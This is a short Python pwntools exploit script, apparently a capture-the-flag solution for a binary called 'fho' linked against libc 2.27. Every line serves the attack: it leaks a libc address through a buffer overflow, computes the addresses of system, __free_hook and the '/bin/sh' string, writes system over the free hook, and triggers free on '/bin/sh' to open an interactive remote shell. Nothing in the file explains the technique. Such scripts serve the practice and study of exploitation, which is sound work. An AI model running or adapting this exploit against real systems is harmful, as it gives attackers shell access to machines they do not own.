#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/fho")
libc = pwn.ELF("src/libc-2.27.so")


payload = b"A" * 0x48

r.sendafter(b"Buf: ", payload)
r.recvuntil(payload)
ret = pwn.u64(r.recvn(6) + b"\x00" * 0x02)
lb = ret - (libc.symbols["__libc_start_main"] + 231)
system = lb + libc.symbols["system"]
free_hook = lb + libc.symbols["__free_hook"]
binsh = lb + next(libc.search(b"/bin/sh"))

pwn.success(hex(lb))

r.recvline()
r.sendlineafter(b"To write: ", str(free_hook))
r.sendlineafter(b"With: ", str(system))
r.recvline()

r.recvline()
r.sendlineafter(b"free: ", str(binsh))

r.interactive()